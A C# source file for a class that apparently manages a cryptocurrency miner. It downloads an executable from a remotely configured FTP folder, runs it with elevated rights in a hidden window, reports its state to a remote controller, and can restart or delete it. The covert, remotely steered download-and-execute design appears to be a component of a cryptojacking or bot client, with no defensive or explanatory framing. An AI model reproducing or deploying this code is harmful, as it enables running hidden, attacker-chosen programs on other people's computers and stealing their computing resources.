using ClientWorker;
using Interfaces;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace Service
{
    public static class MClass
    {
        public static bool isWorking = false;

        public static Process MProcess;

        public static void Start()
        {
            if (!isWorking)
            {
                if (CheckLocalM())
                {
                    MProcess = new Process
                    {
                        StartInfo =
                {
                    FileName = Properties.Settings.Default.MLocalFloader + "\\" + Properties.Settings.Default.MFileName,
                    Verb = "runas",
                    Arguments = Properties.Settings.Default.MArgs,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
                    };
                    MProcess.EnableRaisingEvents = true;
                    MProcess.Exited += new EventHandler(MExited);
                    MProcess.Start();

                    Log.Send("RunM_"+ Properties.Settings.Default.MLocalFloader + "\\" + Properties.Settings.Default.MFileName);
                    isWorking = true;
                    try
                    {
                        Unit MUint = new Unit("ChangeStateMiner", new object[] { isWorking });
                        Program.netSender.SendData(MUint);
                    }
                    catch { }
                }
                else
                {
                    DownloadM();
                    if (CheckLocalM()) Start();
                }
            }
            else
            {
                ReStart();
            }
        }

        public static void MExited(object sender, System.EventArgs e)
        {
            isWorking = false;
            Unit MUint = new Unit("ChangeStateMiner", new object[] { isWorking });
            Program.netSender.SendData(MUint);
        }

        public static void Stop()
        {
            try
            {
                MProcess.Kill();
            }
            catch(Exception ex)
            {
                Log.Send("MClass.Stop(): " + ex.Message);
            }


        }

        public static void ReStart()
        {
            Stop();
            Start();
        }

        public static void DownloadM()
        {
            FileManager.Download(Properties.Settings.Default.MFTPFloader, Properties.Settings.Default.MLocalFloader);
        }

        public static void SetM(string ftpFloader, string localFloader, string fileName,string args, bool isMiner, DDMiners valute)
        {
            Properties.Settings.Default.MFTPFloader = ftpFloader;
            Properties.Settings.Default.MLocalFloader = localFloader;
            Properties.Settings.Default.MFileName = fileName;
            Properties.Settings.Default.MArgs = args;
            Properties.Settings.Default.IsMiner = isMiner;
            Properties.Settings.Default.Valute = (int)valute;
            Properties.Settings.Default.Save();
        }

        private static bool CheckLocalM()
        {
            bool result = false;

            try
            {
                if (File.Exists(Properties.Settings.Default.MLocalFloader + "\\" + Properties.Settings.Default.MFileName))
                {
                    result = true;
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }

            return result;
        }

        public static void DeteteMFile()
        {
            File.Delete(Properties.Settings.Default.MLocalFloader + "\\" + Properties.Settings.Default.MFileName);
        }
    }
}
